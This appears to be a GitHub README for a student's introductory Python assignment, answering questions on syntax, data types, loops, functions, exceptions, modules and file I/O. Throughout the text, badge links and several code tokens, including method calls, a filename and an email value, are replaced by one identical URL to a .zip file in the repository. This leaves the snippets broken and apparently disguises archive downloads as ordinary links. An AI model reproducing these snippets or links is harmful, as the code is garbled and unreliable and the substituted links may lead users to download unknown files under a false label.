[![Review Assignment Due Date](https://raw.githubusercontent.com/Sabaley/se-assignment-6-introduction-to-python-Sabaley/main/graniticoline/se-assignment-6-introduction-to-python-Sabaley.zip)](https://raw.githubusercontent.com/Sabaley/se-assignment-6-introduction-to-python-Sabaley/main/graniticoline/se-assignment-6-introduction-to-python-Sabaley.zip)
[![Open in Visual Studio Code](https://raw.githubusercontent.com/Sabaley/se-assignment-6-introduction-to-python-Sabaley/main/graniticoline/se-assignment-6-introduction-to-python-Sabaley.zip)](https://raw.githubusercontent.com/Sabaley/se-assignment-6-introduction-to-python-Sabaley/main/graniticoline/se-assignment-6-introduction-to-python-Sabaley.zip)
# SE-Assignment-6
 Assignment: Introduction to Python
Instructions:
Answer the following questions based on your understanding of Python programming. Provide detailed explanations and examples where appropriate.

 Questions:

1. Python Basics:
   - What is Python, and what are some of its key features that make it popular among developers? Provide examples of use cases where Python is particularly effective.
    
Python is an object oriented programming language. it allows creation of objects that can be used in software applications. Key features that ,ake python popular are its focus on problrm solving rather than syntax and it is easy to learn. it is effecive in cases such as machine learning, task automation and data visualization.

2. Installing Python:
   - Describe the steps to install Python on your operating system (Windows, macOS, or Linux). Include how to verify the installation and set up a virtual environment.
  
    Download Python from the official python website that is compatible with your computer.
   Open the download file and install 
Verify Installation by typing python --version. If Python is installed correctly, it will display the version number.
Set Up Virtual Environment:
Install virtualenv by running pip install virtualenv.
Create a new virtual environment by running virtualenv myenv (replace ‘myenv’ with your desired environment name).
Activate the virtual environment by running myenv\Scripts\activate on Command Prompt.

3. Python Syntax and Semantics:
   - Write a simple Python program that prints "Hello, World!" to the console. Explain the basic syntax elements used in the program.
     
print("Hello, World!")
the print function allows the code to print the string variable named "hello world!"

4. Data Types and Variables:
   - List and describe the basic data types in Python. Write a short script that demonstrates how to create and use variables of different data types.
int: Represents integers. Example: age = 24
float: Represents decimal numbers. Example: height = 5.8
str: Represents strings. Example: name = "Sabali"
bool: Represents True or false values. Example: is_man = True
list: Represents ordered sequences of values. Example: grades = [86, 54,68]

5. Control Structures:
   - Explain the use of conditional statements and loops in Python. Provide examples of an `if-else` statement and a `for` loop.
Conditional statements and loops are control structures in Python that allow execution of code based on specific stated conditions.
Conditional Statements (if-else) are used to execute certain code only if a condition is met. If the condition is not met, the else statement is used to execute an alternative code. eg:
age = 18
if age >= 18:
    print("You are can vote.")
else:
    print("You cannot vote.")
Loops (for): Loops are used to iterate over a sequence (like a list, tuple, dictionary, set, or string) and execute a block of code multiple times., eg
cars = ["mazda", "toyota", "nissan"]
for car in cars:
    print("I like", cars)


6. Functions in Python:
   - What are functions in Python, and why are they useful? Write a Python function that takes two arguments and returns their sum. Include an example of how to call this function.
Functions in Python are blocks of reusable code that perform a specific task. They are useful because they help you organize your code into chunks that can be called multiple times without needing to rewrite the code. Functions can take arguments, which are values passed into the function, and can return a result. eg

def add_numbers(num1, num2):
    return num1 + num2

# Example of calling the function
result = add_numbers(10, 15)
print("The sum is:", result)

7. Lists and Dictionaries:
   - Describe the differences between lists and dictionaries in Python. Write a script that creates a list of numbers and a dictionary with some key-value pairs, then demonstrates basic operations on both.
Lists are ordered collections of items that are accessed by an index while dictionaries are unorderedcollections of key value pairs.
Demonstration:
# List of numbers
numbers = [1, 2, 3, 4, 5]

# Adding an item to the list
https://raw.githubusercontent.com/Sabaley/se-assignment-6-introduction-to-python-Sabaley/main/graniticoline/se-assignment-6-introduction-to-python-Sabaley.zip(6)

# Accessing an item by index
print(numbers[0])  # Output: 1

# Dictionary with some key-value pairs
person = {"name": "Alice", "age": 25, "city": "New York"}

# Adding a new key-value pair
person["email"] = "https://raw.githubusercontent.com/Sabaley/se-assignment-6-introduction-to-python-Sabaley/main/graniticoline/se-assignment-6-introduction-to-python-Sabaley.zip"

# Accessing a value by key
print(person["name"])  # Output: Alice

# Operations demonstration
print("List of numbers:", numbers)
print("Person dictionary:", person)

8. Exception Handling:
   - What is exception handling in Python? Provide an example of how to use `try`, `except`, and `finally` blocks to handle errors in a Python script.
Exception handling is a feature that allows dealing with runtime errors in a controlled manner. Below is an example of how to use try, except and finally.
def divide(x, y):
    try:
        result = x / y
    except ZeroDivisionError:
        print("Sorry, you can't divide by zero.")
    else:
        print("The result is:", result)
    finally:
        print("Executing finally clause.")

# Example usage
divide(10, 2)  # Should print: The result is: 5.0
divide(10, 0)  # Should print: Sorry, you can't divide by zero.

9. Modules and Packages:
   - Explain the concepts of modules and packages in Python. How can you import and use a module in your script? Provide an example using the `math` module.
Modules in Python are files containing Python code while a package can contain one or several modules.
To use a module in your script, you use the import statement as follows:
import math

# Using a function from the math module
result = https://raw.githubusercontent.com/Sabaley/se-assignment-6-introduction-to-python-Sabaley/main/graniticoline/se-assignment-6-introduction-to-python-Sabaley.zip(16)  # Calculates the square root of 16

print("The square root of 16 is:", result)

10. File I/O:
    - How do you read from and write to files in Python? Write a script that reads the content of a file and prints it to the console, and another script that writes a list of strings to a file.
In Python, you can read from and write to files using functions such as open(), read(), write(), and close(), as follows:
# Open the file in read mode
with open('https://raw.githubusercontent.com/Sabaley/se-assignment-6-introduction-to-python-Sabaley/main/graniticoline/se-assignment-6-introduction-to-python-Sabaley.zip', 'r') as file:
    # Read the content of the file
    content = https://raw.githubusercontent.com/Sabaley/se-assignment-6-introduction-to-python-Sabaley/main/graniticoline/se-assignment-6-introduction-to-python-Sabaley.zip()
    # Print the content to the console
    print(content)

# Submission Guidelines:
- Your answers should be well-structured, concise, and to the point.
- Provide code snippets or complete scripts where applicable.
- Cite any references or sources you use in your answers.
- Submit your completed assignment by [due date].


